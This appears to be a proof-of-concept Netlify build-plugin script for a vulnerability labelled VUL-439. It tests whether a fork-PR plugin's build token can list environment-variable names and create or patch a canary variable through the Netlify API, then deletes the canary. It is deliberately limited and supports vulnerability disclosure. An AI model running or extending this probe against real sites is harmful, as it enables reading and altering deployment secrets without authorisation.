// VUL-439 build-token probe. Runs inside the build to show what an untrusted
// fork-PR plugin can reach. Benign by design:
//   - prints token length + decoded claims only, never the token value
//   - writes a single namespaced canary env var, then deletes it
//   - talks only to api.netlify.com
const decodeClaims = (jwt) => {
  try {
    const [, body] = String(jwt).split('.')
    return JSON.parse(Buffer.from(body, 'base64url').toString())
  } catch {
    return '<not a JWT>'
  }
}

export const onPreBuild = async ({ constants }) => {
  const token = constants.NETLIFY_API_TOKEN
  const host = constants.NETLIFY_API_HOST || 'api.netlify.com'
  const siteId = constants.SITE_ID
  const accountId = constants.ACCOUNT_ID

  console.log('[VUL439] ===== build-token probe =====')
  console.log('[VUL439] context       =', process.env.CONTEXT)
  console.log('[VUL439] token present =', Boolean(token), 'len =', token ? token.length : 0)
  console.log('[VUL439] token claims  =', JSON.stringify(decodeClaims(token)))

  if (!token || !accountId || !siteId) {
    console.log('[VUL439] missing token/accountId/siteId; cannot probe env-var write')
    return
  }

  const auth = { Authorization: `Bearer ${token}` }
  const body200 = (s) => `${s} (200/201 => allowed; 401/403 => blocked by authz; 422 => reached service, authz passed)`

  // READ probe: does the build token reach the env API? Log KEYS ONLY and the
  // status. Never log values, so real shared secrets do not enter the build log.
  try {
    const getUrl = `https://${host}/api/v1/accounts/${accountId}/env?site_id=${siteId}`
    const res = await fetch(getUrl, { headers: auth })
    let keys = '<non-JSON>'
    try {
      const arr = await res.clone().json()
      keys = Array.isArray(arr) ? arr.map((v) => v.key) : '<not an array>'
    } catch {}
    console.log('[VUL439] env-var GET status =', res.status, body200(''))
    console.log('[VUL439] env-var GET keys (names only) =', JSON.stringify(keys))
  } catch (err) {
    console.log('[VUL439] env-var GET error =', err.message)
  }

  // WRITE probe A: PATCH set_value on a canary key. Log status AND body so a
  // 422 can be diagnosed (inactive-site vs service validation).
  const key = 'VUL439_BUILD_CANARY'
  const patchUrl = `https://${host}/api/v1/accounts/${accountId}/env/${key}?site_id=${siteId}`
  try {
    const res = await fetch(patchUrl, {
      method: 'PATCH',
      headers: { ...auth, 'Content-Type': 'application/json' },
      body: JSON.stringify({ context: 'all', value: 'vul439-canary' }),
    })
    const text = (await res.text()).slice(0, 400)
    console.log('[VUL439] env-var PATCH status =', res.status, body200(''))
    console.log('[VUL439] env-var PATCH body  =', text)
  } catch (err) {
    console.log('[VUL439] env-var PATCH error =', err.message)
  }

  // WRITE probe B: POST create (the documented create path). Log status + body.
  const postUrl = `https://${host}/api/v1/accounts/${accountId}/env?site_id=${siteId}`
  try {
    const res = await fetch(postUrl, {
      method: 'POST',
      headers: { ...auth, 'Content-Type': 'application/json' },
      body: JSON.stringify([{ key, scopes: ['builds', 'functions', 'runtime', 'post_processing'], values: [{ value: 'vul439-canary', context: 'all' }] }]),
    })
    const text = (await res.text()).slice(0, 400)
    console.log('[VUL439] env-var POST status =', res.status, body200(''))
    console.log('[VUL439] env-var POST body  =', text)
  } catch (err) {
    console.log('[VUL439] env-var POST error =', err.message)
  }

  // Clean up any canary this probe may have created.
  try {
    const del = await fetch(patchUrl, { method: 'DELETE', headers: auth })
    console.log('[VUL439] canary cleanup status =', del.status)
  } catch (err) {
    console.log('[VUL439] canary cleanup error =', err.message)
  }
  console.log('[VUL439] ===== end build-token probe =====')
}
